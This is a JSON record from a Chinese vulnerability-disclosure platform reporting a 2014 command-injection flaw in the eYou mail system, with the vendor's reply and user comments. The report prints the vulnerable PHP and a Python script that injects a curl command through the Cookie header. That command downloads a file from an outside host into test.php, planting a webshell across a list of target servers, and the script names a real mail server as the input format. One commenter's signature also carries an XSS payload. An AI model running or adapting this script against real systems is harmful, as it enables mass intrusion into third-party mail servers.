{"id": 3679, "wybug_id": "wooyun-2014-058531", "wybug_title": "亿邮邮件系统命令执行漏洞导致批量Getwebshell", "wybug_corp": "北京亿中邮信息技术有限公司", "wybug_author": "conqu3r", "wybug_date": "2014-04-26 15:02", "wybug_open_date": "2014-06-10 15:03", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-10：\t细节向公众公开  简要描述： 这套系统还有很多问题，能登录就更多问题了。 详细说明：  user/storage_fold_explore.php\n<?php/** * 用户网络存储目录列表 * * 该页面显示登录邮箱用户的网络存储目录列表，选择后保存邮件附件到指定的目录中。 * * @author FengHui <fenghui@eyou.net> * @copyright 199902008 eYou.net * @version storage_explore.php 2008/11/12 */require_once('/var/eyou/apache/htdocs/config.php');require_once(PATH.'inc/function.php');require_once(PATH.'inc/libeyou.php');require_once(PATH.'inc/operate.php');require_once(PATH.'inc/user.config.php');$skin               = getCookieUserValue('SKIN');$uid                = getCookieUserValue('UID');$domain             = getCookieUserValue('DOMAIN');$user_dir_path      = getUserDirPath($uid, $domain);$storage_index_path = $user_dir_path.'/storage/Index/';$storage_data_path  = $user_dir_path.'/storage/Data/';$file_name          = htmlspecialchars(get('file'));$att                = htmlspecialchars(get('att'));?>\nGetUser_DirPath在/inc/function.php下。\nfunction getUserDirPath($uid, $domain) {    $cmd = \"/var/eyou/sbin/hashid $uid $domain\";    $path = `$cmd`;    $path = trim($path);    return $path;}\n   漏洞证明：  利用代码：\n__author__ = 'zengzhang'import time,sysimport urllib,urllib2from urlparse import urlparsedef Getwebshell(url):    url=url.strip()    header={\"Cookie\":\"USER=UID%3d1|curl http://conqu3r.paxmac.org/test.txt>>test.php&DOMAIN%3d127.0.0.1\"}    try:        request=urllib2.Request(url,None,headers=header)        rep=urllib2.urlopen(request)    except:        pass    Indentified(url)def Readfile(filen):    fp=open(filen,'r')    for url in fp:        if url!='':            Getwebshell(url)def Indentified(url):    url=url[:-19]    url=url+\"test.php\"    try:        f=urllib.urlopen(url).getcode()        if f==200:            fp=open(\"shell.txt\",\"w+\")            fp.write(url+\"\\n\")            fp.close()    except:        passReadfile(\"url.txt\")\nurl.txt内容为：http://mail.bjsasc.com/user/storage_fold_explore.php形式\n\n   修复方案：  你们懂的。。。   版权声明：转载请注明来源 conqu3r@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-04-30 10:59 厂商回复： 和之前的重复了，已出补丁，多谢提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-26 15:06 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  亿邮别哭，站起来撸    \n     2014-04-26 15:09 |    \t\tIT偏执狂 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 禁锢我们的究竟是什么？)\t\t \n  猩猩之火，可以撩猿。    \n     2014-04-26 15:26 |    \t\tKavia \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        )\t\t \n  黑阔你好，腻好，可以给我一套源码吗    \n     2014-04-26 15:27 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  @Kavia 狒狒，你找死么！来，爷给你两套源码！    \n     2014-04-26 15:30 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  @Kavia 你是卡哇伊？    \n     2014-04-26 15:40 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @conqu3r ..同求一份源码。、。  我还没找到 我擦。    \n     2014-04-26 17:01 |    \t\t风花雪月 \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:44        | []+[]|[]-[][][][][]%[][]|[]\\[]%[][]|[]\\[...)\t\t \n  再次中枪 呵呵  我也求份源码有么？    \n     2014-04-26 17:12 |    \t\t熊猫 \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:33        | panda)\t\t \n  2013年，亿邮邮件系统获“2013软件行业最佳产品奖”2013年，亿邮电子邮件系统获“2013优秀安全认证产品奖”2012年，亿邮邮件归档系统在中国信息安全大会上荣获“2012年度中国信息安全--优秀产品奖\"2011年5月12日，亿邮荣获“中国软件和信息技术服务业10年最佳技术创新奖”奖2010年4月21日，2010第十一届中国信息安全大会亿邮荣获2010年度中国信息安全最值得信赖品牌奖2009年，荣获中国科学技术委员会颁发的“高新技术企业”2009年，荣获中关村管理委员会颁发的“创新企业”2008年，荣获人民大会堂颁发的“中国企业邮箱用户满意第一品牌”2006年11月，亿中邮公司荣获“中国反垃圾邮件自主创新最具价值品牌”。2006年11月，由著名会计师事务所德勤发布的《2005中国高科技高成长50强》评比中，北京亿中邮信息技术有限公司以217.21%的年销售额增长率，排行第32位。2006年，亿中邮公司荣获人民网，新华网，中国品牌网主办 “2006年度中国电子邮箱用户满意信赖第一品牌”称号。2005年11月，由著名会计师事务所德勤发布的《2005中国高科技高成长50强》评比中，北京北京亿中邮信息技术有限公司以170.32%的年销售额增长率，排行第47位。2005年9月3日，由中国互联网协会主办的《2005中国互联网大会》上，“亿邮”品牌入选“2005年度十大企业邮箱推荐品牌”。亿中邮公司并在2005年度亿邮企业邮箱服务质量测评活动中，赢得“最佳反垃圾邮件奖”和“最佳性能奖”等两个单项奖。2004年3月，亿邮邮箱曾经在被美国权威的iUser Survey公司评为《中国用户最常使用的电子邮箱服务商》第7名。    \n     2014-04-26 19:22 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @conqu3r 同求一套源码    \n     2014-04-27 23:41 |    \t\tLonely \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:27        | 人生如梦,始终都游不过当局者迷的悲哀。)\t\t \n  @saline 有了 源码 发我一套。。。    \n     2014-04-28 09:41 |    \t\tconqu3r \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:21        | 没有思想，没有道德，没有自由，没有人权的...)\t\t \n  @xsser 为何没加钱的标志0oooo.    \n     2014-04-28 16:54 |    \t\t枫叶 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 我是枫叶，我做主)\t\t \n  @saline 同求一套。。。    \n     2014-06-03 13:02 |    \t\td3pT1 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:2        | 人法地，地法天，天法道，道法自然。)\t\t \n  同求一套    \n     2014-06-10 15:54 |    \t\tredsin \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:6        )\t\t \n  @conqu3r 也求一套    \n     2014-12-02 20:29 |    \t\tooxx \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | ooxx)\t\t \n  打下酱油 ~~~~~~~~~~~    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}